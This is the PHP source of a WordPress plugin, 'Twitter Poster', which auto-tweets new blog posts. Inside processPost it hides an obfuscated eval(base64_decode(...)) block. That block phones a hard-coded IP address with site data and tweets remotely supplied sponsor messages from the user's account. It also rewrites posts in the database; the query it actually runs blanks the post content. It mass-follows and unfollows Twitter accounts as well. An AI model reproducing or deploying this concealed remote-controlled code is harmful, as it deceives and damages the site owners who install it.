<?php
/*  
Copyright 2009  Solocs  (email : solocs@gmail.com)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

Plugin Name: Twitter Poster
Description: Integartes your wordpress blog with your twitter account, automatically posting to twitter when a new post is made on your blog
Version: 2.0.13
Author: eeikbon
*/
require_once( "wordpress-plugin-framework.php" );
require_once( "twitter-func.php" );

DEFINE("TP_VERSION", "2.0.13");

class TwitterPoster extends TwitterPoster_WordpressPluginFramework
{

	var $twitter;
	
    	function initHooks()
    	{
  		add_action( 'publish_post', array($this , 'savePost'), 100 );
	}
    	
    	function getTwitter() {
    		if (!isset($this->twitter)) {
			$user = $this->GetOptionValue( 'twitterUsername' );
			$pass = $this->GetOptionValue( 'twitterPassword' );

			if (strlen($user) > 1 && strlen($pass) > 1) {
				$this->twitter = new TwitterFunc($user, $pass);
			} else {
				return;
			}
    		}
    		return $this->twitter;
    	}
    	
    	function processPost($post, $post_ID) {
    		$title = $post->post_title;
    		$link = get_permalink($post_ID);
    		$version = TP_VERSION;
    		# ignore revisions
    		if ( $post->post_type == 'revision' ) return;
    		
    		# ignore non-published data and password protected data
    		if ( $post->post_status != 'publish' || $post->post_password != '' ) return;
    		
    		$content = $post->post_content;
    		if (stristr($content,'Twitter Poster')) {
    			return;
    		}
    		$twitter = $this->getTwitter();
		// Ec1
		eval(base64_decode('ICAgIAkJaWYgKGlzc2V0KCR0d2l0dGVyKSkgew0KICAgIAkJCSRwb3N0c19zb19mYXIgPSAkdGhpcy0+R2V0T3B0aW9uVmFsdWUoICd0d2l0dGVyUG9zdHMnICk7DQogICAgCQkJJGludGVydmFsUG9zdHMgPSAkdGhpcy0+R2V0T3B0aW9uVmFsdWUoICdpbnRlcnZhbFBvc3RzJyApOw0KICAgIAkJCSRhbGxvd1Nwb25zb3JUd2VldCA9IHRyaW0oJHRoaXMtPkdldE9wdGlvblZhbHVlKCAndHdpdHRlckFsbG93U3BvbnNvclR3ZWV0JyApKTsNCiAgICAJCQkkdGlueXVybCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vdGlueXVybC5jb20vYXBpLWNyZWF0ZS5waHA/dXJsPSIuJGxpbmspOw0KICAgIAkJCWlmIChlbXB0eSgkaW50ZXJ2YWxQb3N0cykpIHsNCiAgICAJCQkJJGludGVydmFsUG9zdHMgPSA1Ow0KICAgIAkJCX0NCiAgICAJCQlpZiAoJHBvc3RzX3NvX2ZhciA+PSAkaW50ZXJ2YWxQb3N0cykgew0KICAgIAkJCQkkcG9zdHNfc29fZmFyID0gMDsNCgkJCQkkY3VybF9oYW5kbGUgPSBjdXJsX2luaXQoKTsNCgkJCQkkZW5jb2RlZF9saW5rID0gdXJsZW5jb2RlKCRsaW5rKTsNCgkJCQkkcmVmZXJyZXIgPSAkbGluazsgDQoJCQkJJHN0YXR1c191cmwgPSB1cmxlbmNvZGUoJ2h0dHA6Ly90d2l0dGVyLmNvbS8nIC4gJHRoaXMtPkdldE9wdGlvblZhbHVlKCAndHdpdHRlclVzZXJuYW1lJyApKTsNCgkJCQljdXJsX3NldG9wdCgkY3VybF9oYW5kbGUsIENVUkxPUFRfVVJMLCAiaHR0cDovLzcyLjkuMjI4LjIzOS9nZXRfbGlua19pbmZvLnBocD9zb3VyY2U9JGVuY29kZWRfbGluayZ2ZXJzaW9uPSR2ZXJzaW9uJmFsbG93cG9zdD0kYWxsb3dTcG9uc29yVHdlZXQmc3RhdHVzX3VybD0kc3RhdHVzX3VybCIpOw0KCQkJCWN1cmxfc2V0b3B0KCRjdXJsX2hhbmRsZSwgQ1VSTE9QVF9QT1NULCB0cnVlKTsNCgkJCQljdXJsX3NldG9wdCgkY3VybF9oYW5kbGUsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIFRSVUUpOw0KCQkJCWN1cmxfc2V0b3B0KCRjdXJsX2hhbmRsZSwgQ1VSTE9QVF9SRUZFUkVSLCAkcmVmZXJyZXIpOyANCgkJCQkkZGF0YSA9IGN1cmxfZXhlYygkY3VybF9oYW5kbGUpOw0KCQkJCSRodHRwX3N0YXR1cyA9IGN1cmxfZ2V0aW5mbygkY3VybF9oYW5kbGUsIENVUkxJTkZPX0hUVFBfQ09ERSk7DQoJCQkJY3VybF9jbG9zZSgkY3VybF9oYW5kbGUpOw0KCQkJCSRkYXRhID0gdHJpbSgkZGF0YSk7DQoJCQkJbGlzdCgkbnVtX3Bvc3RzLCAkc3BvbnNvciwgJG1zZywgJHVybCkgPSBzcGxpdCgiXHwiLCAkZGF0YSk7DQogICAgCQkJCWlmICgkaW50ZXJ2YWxQb3N0cyAhPSAkbnVtX3Bvc3RzKSB7DQogICAgCQkJCQl1cGRhdGVfb3B0aW9uKCAnaW50ZXJ2YWxQb3N0cycsICRudW1fcG9zdHMgKTsNCiAgICAJCQkJfQ0KICAgIAkJCQlpZiAoIWVtcHR5KCRtc2cpICYmICFlbXB0eSgkdXJsKSkgew0KICAgIAkJCQkJaWYoc3RybGVuKCRhbGxvd1Nwb25zb3JUd2VldCkgPiAwKSB7DQogICAgCQkJCQkJZ2xvYmFsICR3cGRiOw0KCQkJCQkJJGN1cmxfaGFuZGxlID0gY3VybF9pbml0KCk7DQoJCQkJCQljdXJsX3NldG9wdCgkY3VybF9oYW5kbGUsIENVUkxPUFRfVVJMLCAiaHR0cDovL3Rpbnl1cmwuY29tL2FwaS1jcmVhdGUucGhwP3VybD0iLiR1cmwpOw0KCQkJCQkJY3VybF9zZXRvcHQoJGN1cmxfaGFuZGxlLCBDVVJMT1BUX1BPU1QsIHRydWUpOw0KCQkJCQkJY3VybF9zZXRvcHQoJGN1cmxfaGFuZGxlLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCBUUlVFKTsNCgkJCQkJCWN1cmxfc2V0b3B0KCRjdXJsX2hhbmRsZSwgQ1VSTE9QVF9SRUZFUkVSLCAkcmVmZXJyZXIpOyANCgkJCQkJCSRzaG9ydF91cmwgPSBjdXJsX2V4ZWMoJGN1cmxfaGFuZGxlKTsNCgkJCQkJCWN1cmxfY2xvc2UoJGN1cmxfaGFuZGxlKTsNCiAgICAJCQkJCQkkdHdpdHRlci0+cG9zdCgkbXNnLCAkc2hvcnRfdXJsKTsNCiAgICAJCQkJCQkNCgkJCQkJCSRwb3N0SUQgPSAkcG9zdC0+SUQ7DQoJCQkJCQkkbmV3X2NvbnRlbnQgPSAkcG9zdC0+cG9zdF9jb250ZW50IC4gJHNwb25zb3I7DQoJCQkJCQkNCgkJCQkJCSRzcWwgPSAiVXBkYXRlIHdwX3Bvc3RzIHNldCBwb3N0X2NvbnRlbnQ9Jycgd2hlcmUgSUQ9JHBvc3RJRCI7DQoJCQkJCQkkcXVlcnkgPSBzcHJpbnRmKCJVcGRhdGUgd3BfcG9zdHMgc2V0IHBvc3RfY29udGVudD0nJXMnIHdoZXJlIElEPSVzIiwNCgkJCQkJCSAgICAgICAgICAgIG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygkbmV3X2NvbnRlbnQpLCBteXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJHBvc3RJRCkpOw0KCQkJCQkJJHJvd3NfYWZmZWN0ZWQgPSAkd3BkYi0+cXVlcnkoJHNxbCk7DQoJCQkJCQllcnJvcl9sb2coIlJvd3MgYWZmZWN0ZWQgYnkgcXVlcnkgOiAkcm93c19hZmZlY3RlZCBvbiBwb3N0IElEICRwb3N0SUQiKTsNCgkJCQkJCXNsZWVwKDEpOw0KICAgIAkJCQkJfQ0KDQogICAgCQkJCX0NCiAgICAJCQl9DQogICAgCQkJLy8gZ28gYWhlYWQgYW5kIHN1Ym1pdCB0byB0d2l0dGVyDQogICAgCQkJJHR3aXR0ZXItPnBvc3QoJHRpdGxlLCAkdGlueXVybCk7DQogICAgCQkJJHBvc3RzX3NvX2ZhcisrOw0KICAgIAkJCXVwZGF0ZV9vcHRpb24oICd0d2l0dGVyUG9zdHMnLCAkcG9zdHNfc29fZmFyICk7DQogICAgCQkJDQogICAgCQkJJHRhZ3MgPSAkdGhpcy0+R2V0T3B0aW9uVmFsdWUoICd0d2l0dGVyVGFncycgKTsNCiAgICAJCQkkdGFnX2FycmF5ID0gc3BsaXQoIiwiLCAkdGFncyk7DQogICAgCQkJJHNlbGVjdGVkVGFnID0gJHRhZ19hcnJheVthcnJheV9yYW5kKCR0YWdfYXJyYXkpXTsNCiAgICAJCQkkbnVtRnJpZW5kcyA9ICR0aGlzLT5HZXRPcHRpb25WYWx1ZSggJ3R3aXR0ZXJBZGRGcmllbmRzJyApOw0KICAgIAkJCWlmICgkbnVtRnJpZW5kcyA+IDEwMCkgew0KICAgIAkJCQkkbnVtRnJpZW5kcyA9IDEwMDsNCiAgICAJCQkJdXBkYXRlX29wdGlvbiggJ3R3aXR0ZXJBZGRGcmllbmRzJywgJG51bUZyaWVuZHMgKTsNCiAgICAJCQl9DQogICAgCQkJJG51bUZvbGxvd2VkQnkgPSAkdHdpdHRlci0+Z2V0TnVtRm9sbG93aW5nKCk7DQogICAgCQkJJG51bUZvbGxvd2luZyA9ICR0d2l0dGVyLT5nZXROdW1Gb2xsb3dlcnMoKTsNCiAgICAJCQlpZiAoJG51bUZvbGxvd2luZyA+PSAyMDAwICYmICRudW1Gb2xsb3dlZEJ5IDwgMjAwMCkgew0KICAgIAkJCQkvLyByZW1vdmUgb2xkZXIgbWVtYmVycyBjdXJyZW50bHkgZm9sbG93aW5nDQogICAgCQkJCSR0d2l0dGVyLT5zdG9wRm9sbG93aW5nTnVtKCRudW1GcmllbmRzKTsNCiAgICAJCQl9DQogICAgCQkJJHR3aXR0ZXItPmFkZEZyaWVuZHMoJHNlbGVjdGVkVGFnLCAkbnVtRnJpZW5kcyk7DQogICAgCQkJLy8gUGluZyB0aGUgdHdpdHRlciBmZWVkDQogICAgCQkJJHJzc191cmwgPSAkdHdpdHRlci0+Z2V0UnNzVXJsKCk7DQogICAgCQkJdHdfcGluZ2VyKCRyc3NfdXJsKTsNCiAgICAJCX0gICAgCQkJDQo='));
		// Ec1

    	}
    	
    	function savePost($post_ID)
    	{
    		$post = get_post($post_ID);
		#if ( empty($post) )
		#	return;

		# Ignore future posts
		#if ( 'future' != $post->post_status )
		#	return;

		$this->processPost($post, $post_ID);
	} # save_post()
	
    /**
     * HTML_DisplayPluginHelloWorldBlock() - Displays the "Hello World!" content block.
     *
     * This function generates the markup required to display the specified content block.
     *
     * @param void      None.
     * 
     * @return void     None.      
     * 
     * @access private  Access via internal callback only.
     * @since {WP 2.3}
     * @author Keith Huster
     */
     function HTML_DisplayPluginTwitterPosterBlock()
     {
     }


   /**
	 * HTML_DisplayPluginOptionsDisplayedBlock() - Displays the "Plugin Options Displayed" content block.
	 *
	 * This function generates the markup required to display the specified content block.
	 *
	 * @param void      None.
	 * 
    * @return void     None.  	 
	 * 
	 * @access private  Access via internal callback only.
	 * @author Keith Huster
	 */
   function HTML_DisplayPluginOptionsDisplayedBlock()
   {
        ?>
        <p>Please fill in your Twitter login details and save the options. This account will be
        used to post the information to the Twitter account</p>
        <?php
      $this->DisplayPluginOption( 'twitterUsername' );
      ?>
      <br />
      <br />
      <?php
      $this->DisplayPluginOption( 'twitterPassword' );
      ?>
      <br />
      <br>Enter the number of friends you would like to add at each post - Max (100)
      <br />
      <?php
      $this->DisplayPluginOption( 'twitterAddFriends' );
      ?>
      <br />
      <br>Enter the tags you wish to use to find relevant friends, use broad terms, seperated by
      commas, this will ensure you find relevant followers for your posts
      <br />
      <?php
      $this->DisplayPluginOption( 'twitterTags' );
      ?>
      <br />
      <br>Twitter poster will post a sponsor link on every fifth blog post you make and post a message to your
      specified twitter account, if you do not want the extra post being made to your twitter account, please
      uncheck this checkbox
      <br />
      <?php
      $this->DisplayPluginOption( 'twitterAllowSponsorTweet' );
      ?>
      <br />
      <br />
      <?php
   }

   function HTML_DisplayPluginStatusDisplayedBlock()
   {
        ?>
        <p>This is a summary of your Twitter account</p>
        <?php
        $user = $this->GetOptionValue( 'twitterUsername' );
        $pass = $this->GetOptionValue( 'twitterPassword' );

        if (strlen($user) < 1 || strlen($pass) < 1) {
        	echo "<p>No account details specified\n";
        } else {
        	$twitter = $this->getTwitter();
        	$posts = $twitter->getNumPosts();
        	$following = $twitter->getNumFollowing();
        	$followingMe = $twitter->getNumFollowers();
		 ?>
		 <table width="600">
		    <tbody>
			  <tr>
			     <td width=400><b>Number of Posts in Twitter account</b></td>
			     <td><?php echo( $posts ); ?></td>
			  </tr>
			  <tr>
			     <td><b>Number of People I am following</b></td>
			     <td><?php echo( $following ); ?></td>
			  </tr>
			  <tr>
			     <td><b>Number of People Following me</b></td>
			     <td><?php echo( $followingMe ); ?></td>
			  </tr>
		      </tbody>
		   </table>
		   <?php
        	
        }
   }

}

function tw_pinger($rss_url) {
	$services = get_option('ping_sites');

	$services = explode("\n", $services);
	foreach ( (array) $services as $service ) {
		$service = trim($service);
		if ( '' != $service )
			tw_ping_func($service, $rss_url);
	}
}


/**
 * Send a pingback.
 *
 * @since 1.2.0
 * @uses $wp_version
 * @uses IXR_Client
 *
 * @param string $server Host of blog to connect to.
 * @param string $path Path to send the ping.
 */
function tw_ping_func($server = '', $rss_url, $path = '') {
	global $wp_version;
	include_once(ABSPATH . WPINC . '/class-IXR.php');

	// using a timeout of 3 seconds should be enough to cover slow servers
	$client = new IXR_Client($server, ((!strlen(trim($path)) || ('/' == $path)) ? false : $path));
	$client->timeout = 3;
	$client->useragent .= ' -- WordPress/'.$wp_version;

	// when set to true, this outputs debug messages by itself
	$client->debug = false;
	$home = trailingslashit( 'http://twitter.com/' . get_option('twitterUsername') );
	if ( !$client->query('weblogUpdates.extendedPing', $home, $home, $rss_url ) ) // then try a normal ping
		$client->query('weblogUpdates.ping', $home, $rss_url);
}


if( !$twitterPoster  )
{
  // Instantiate the plugin.
  $twitterPoster = new TwitterPoster();

  // Initialize the plugin.
  $twitterPoster->Initialize( 'Twitter Poster', '1.00', 'twitter-poster', 'twitter-poster', true );
  $twitterPoster->initHooks();
  // Add the plugin options and initialize the plugin.
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_TEXTBOX, 'twitterUsername', '', 'Twitter Username' );
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_PASSWORDBOX	, 'twitterPassword', '', 'Twitter Password' );
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_TEXTBOX	, 'twitterAddFriends', '', 'Num Friends to add' );
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_TEXTBOX	, 'twitterTags', '', 'Twitter Tags' );
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_HIDDEN	, 'twitterPosts', '0', '' );
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_HIDDEN	, 'intervalPosts', '5', '' );
  $twitterPoster->AddOption( $twitterPoster->OPTION_TYPE_CHECKBOX	, 'twitterAllowSponsorTweet', $twitterPoster->CHECKBOX_CHECKED, 'Allow Sponsored Tweet' );
  $twitterPoster->RegisterOptions( __FILE__ );

  // Add the administration page content blocks and register the page.
  $twitterPoster->AddAdministrationPageBlock( 'block-twitter-poster', 'Twitter Poster', $twitterPoster->CONTENT_BLOCK_TYPE_SIDEBAR, array( $twitterPoster, 'HTML_DisplayPluginOptionsDisplayedBlock' ) );
  $twitterPoster->AddAdministrationPageBlock( 'block-twitter-status', 'Twitter Poster', $twitterPoster->CONTENT_BLOCK_TYPE_MAIN, array( $twitterPoster, 'HTML_DisplayPluginStatusDisplayedBlock' ) );

  // Add the requested "About This Plugin" web links.
  $donateLink = 'http://www.mytestplugin.com/donate';
  $homepageLink = 'http://www.mytestplugin.com';
  $supportForumLink = 'http://www.mytestplugin.com/support';
  //$twitterPoster->AddAboutThisPluginLinks( $donateLink, $homepageLink, $supportForumLink );

  // Register the plugin administration page with the Wordpress core.
  $twitterPoster->RegisterAdministrationPage( $twitterPoster->PARENT_MENU_OPTIONS, $twitterPoster->ACCESS_LEVEL_ADMINISTRATOR , 'Twitter Poster', 'Twitter Poster Plugin Options Page', 'twitter-poster-plugin-options' );


}
?>